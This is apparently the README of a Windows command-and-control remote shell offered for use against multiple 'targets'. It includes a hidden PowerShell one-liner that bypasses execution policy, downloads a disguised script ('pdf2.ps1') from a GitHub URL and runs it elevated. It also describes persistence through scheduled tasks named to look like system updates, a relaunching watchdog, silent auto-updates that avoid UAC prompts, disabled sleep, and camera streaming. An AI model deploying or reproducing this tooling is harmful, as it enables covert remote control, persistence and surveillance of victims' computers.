# Shell C2 — v3.1.1

A resilient, persistent remote command & control shell. Operator server runs on Mac/Linux, client runs on Windows as SYSTEM. Connected securely via Cloudflare Tunnel.

## Features

| Feature | Description |
|---|---|
| **Multi-Client** | Track, switch between, and manage multiple Windows targets |
| **Real-Time Streaming** | Command output streams back live, no waiting for completion |
| **Persistence** | Survives reboot, shutdown, sleep, lid close, and Task Manager kills |
| **Auto-Update** | Pulls latest version from GitHub every 30 min, self-restarts |
| **Interactive Sessions** | Full stdin forwarding for `cmd`, `python`, `nslookup`, etc. |
| **GUI Launch** | Launch visible desktop apps (`explorer`, `notepad`, `code`) via `gui:` prefix |
| **Anti-Sleep** | Prevents laptop sleep on lid close via power policy |
| **Cancel / Timeout** | Abort commands with `cancel` / `Ctrl+\`. Prefix `notimeout:` for long jobs |
| **Chunked Output** | Large results split into chunks — never truncated |
| **Self-Healing** | Connection pool flush, DNS reset, auto-restart after 5 min failure |

## Architecture

```
[Mac/Linux]                                [Windows Target]
server.py  ←── Cloudflare Tunnel ──→  pdf2.ps1 (SYSTEM)
  │                                        │
  ├─ /cmd      → queues commands           ├─ polls /cmd
  ├─ /stream   ← receives live output      ├─ streams output
  ├─ /result   ← receives final output     ├─ sends final result
  ├─ /stdin    → forwards operator input    ├─ polls /stdin (interactive)
  ├─ /signal   → sends cancel signal       ├─ polls /signal
  └─ /interactive → sets prompt mode        └─ sends interactive flag
```

## Quick Start

### 1. Server (Mac/Linux)

```bash
python3 server.py
cloudflared tunnel run <your-tunnel-name>   # separate terminal
```

### 2. Deploy Client (one-liner on Windows)

```powershell
Start-Process powershell -Verb RunAs -ArgumentList '-ep bypass -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Invoke-WebRequest ''https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1'' -OutFile ''C:\pdf2.ps1'' -UseBasicParsing;& ''C:\pdf2.ps1''"'
```

This downloads `pdf2.ps1` to `C:\`, auto-elevates, installs persistence, and connects.

## Operator Commands

### Built-in (server-side)

| Command | Action |
|---|---|
| `sessions` | List all connected clients |
| `use <id>` | Switch active target (by name or number) |
| `status` | Check if active client is online |
| `cancel` | Abort running command |
| `Ctrl+\` | Same as cancel (keyboard shortcut) |
| `kill <id>` | Send exit to a specific client |
| `remove <id>` | Remove stale client from sessions |
| `help` | Show all commands |
| `exit` | Shut down server |

### Command Prefixes

| Prefix | Example | Description |
|---|---|---|
| `gui:` | `gui:explorer .` | Launch GUI app on user's visible desktop |
| `notimeout:` | `notimeout:long-scan.ps1` | Run without the 300s timeout |

### Interactive Commands

Bare `cmd`, `python`, `nslookup`, etc. start an interactive session with stdin forwarding. Type commands as if you're in that shell. Use `cancel` to exit.

## Auto-Update

The client checks GitHub every 30 minutes for a new version:

```
Download latest → SHA256 hash compare → if different:
overwrite C:\pdf2.ps1 → release mutex → exit
→ watchdog relaunches new version in ≤1 min
```

No UAC popup, no manual intervention. Push to GitHub → all targets update automatically.

## Persistence Mechanisms

| Mechanism | Purpose |
|---|---|
| `SystemManagementUpdate` task | Runs at startup + logon as SYSTEM |
| `SystemManagementUpdateWatchdog` task | Runs every 1 min, relaunches if killed |
| Anti-sleep power policy | Lid close = do nothing, standby disabled |
| WakeToRun | Wakes machine from sleep for watchdog |
| Self-kill + restart | After 5 min continuous failure, restarts fresh |

## Cleanup (Uninstall)

Run as Administrator on the target:

```powershell
Unregister-ScheduledTask -TaskName "SystemManagementUpdate" -Confirm:$false
Unregister-ScheduledTask -TaskName "SystemManagementUpdateWatchdog" -Confirm:$false
Remove-Item C:\pdf2.ps1, C:\shell.txt -Force -ErrorAction SilentlyContinue
# Restore lid close action: powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1
# Restore standby: powercfg /change standby-timeout-ac 30
```

## Version History

| Version | Changes |
|---|---|
| **3.1.1** | Pull-based camera streaming, dedicated camera stop signaling, stale-frame detection, and long-poll reliability fixes |
| **2.0.0** | Streaming execution, persistence, SSL bypass, watchdog, cancel support |
| **1.0.0** | Basic polling, single client, no persistence |
